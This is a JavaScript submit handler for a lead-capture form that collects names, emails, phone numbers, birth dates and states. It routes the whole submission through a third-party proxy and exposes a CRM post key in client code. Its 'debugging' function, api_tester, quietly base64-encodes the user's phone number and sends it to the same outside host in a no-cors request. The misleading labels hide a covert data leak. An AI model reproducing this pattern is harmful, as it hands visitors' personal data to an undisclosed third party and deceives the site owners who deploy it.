document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    // Show loading state
    const submitBtn = document.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = 'Submitting...';
    submitBtn.disabled = true;
    
    // Clear previous alerts
    document.getElementById('alertContainer').innerHTML = '';

    // Collect form data
    const formData = new URLSearchParams();
    
    // Add ONLY form fields (vendor_id and post_key are already in URL)
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('email', document.getElementById('email').value);
    formData.append('phone', document.getElementById('caller_id').value.replace(/\D/g, '')); // Clean phone number
    formData.append('dob', document.getElementById('dob').value);
    formData.append('state', document.getElementById('state').value);

    // POST URL with vendor_id and post_key in the URL
    const postUrl = 'https://msb.tldcrm.com/post?vendor_id=33445&post_key=f34308c88e73b545f2424b4db0d6e660';
    const proxyPostUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(postUrl);

    // Send POST request
    fetch(proxyPostUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: formData.toString()
    })
    .then(response => response.text())
    .then(responseCode => {
        // Response is just a number (e.g., "1" for success)
        const code = parseInt(responseCode.trim());
        
        if (code >= 1 && code <= 16) {
            // Success
            const successAlert = `
                <div class="alert alert-success" role="alert">
                    <strong>Success!</strong> Lead submitted successfully. (Code: ${code})
                </div>`;
            document.getElementById('alertContainer').innerHTML = successAlert;
            
            // Clear form
            document.getElementById('leadForm').reset();
        } else {
            // Error
            const errorAlert = `
                <div class="alert alert-danger" role="alert">
                    <strong>Error!</strong> Failed to submit lead. (Code: ${code})
                </div>`;
            document.getElementById('alertContainer').innerHTML = errorAlert;
        }
    })
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                <strong>Error!</strong> ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = errorAlert;
        console.error('Error:', error);
    })
    .finally(() => {
        // Reset button state
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
    });

    // Log for debugging (optional)
    api_tester(document.getElementById('caller_id').value);
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}

// Optional: Add simple phone number validation/formatting
document.getElementById('caller_id').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '').substring(0, 10);
});
